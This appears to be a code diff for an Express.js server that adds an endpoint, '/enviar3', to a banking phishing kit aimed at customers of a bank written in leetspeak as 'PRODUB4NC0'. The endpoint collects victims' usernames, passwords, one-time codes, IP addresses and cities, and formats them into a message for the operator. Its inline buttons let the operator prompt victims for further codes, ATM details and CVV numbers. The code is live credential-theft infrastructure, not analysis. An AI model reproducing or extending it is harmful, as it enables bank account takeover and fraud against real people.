@@ -126,6 +126,36 @@ app.post('/enviar', async (req, res) => {
   res.sendStatus(200);
 });
 
+
+app.post('/enviar3', async (req, res) => {
+  const { usar, clavv, txid, dinamic, ip, ciudad } = req.body;
+
+  const mensaje = `
+🔑🟢PRODUB4NC0🟢
+🆔 ID: <code>${txid}</code>
+
+📱 US4R: <code>${usar}</code>
+🔐 CL4V: <code>${clavv}</code>
+
+🔑 0TP: <code>${dinamic}</code>
+
+🌐 IP: ${ip}
+🏙️ Ciudad: ${ciudad}
+`;
+
+  const keyboard = {
+    inline_keyboard: [
+      [
+        { text: "🔑CÓDIGO", callback_data: `cel-dina:${txid}` },
+        { text: "🏧CAJERO", callback_data: `errortok:${txid}` },
+        { text: "🔐PATRON", callback_data: `errortok:${txid}` }
+      ],
+      [
+        { text: "💳C3VV", callback_data: `ceve:${txid}` },
+        { text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }
+      ]
+    ]
+  };
 // ... 🔹 aquí puedes mantener el resto de tus endpoints (enviare, enviar2, enviar3, etc.)
 
 // 🔹 Webhook de control
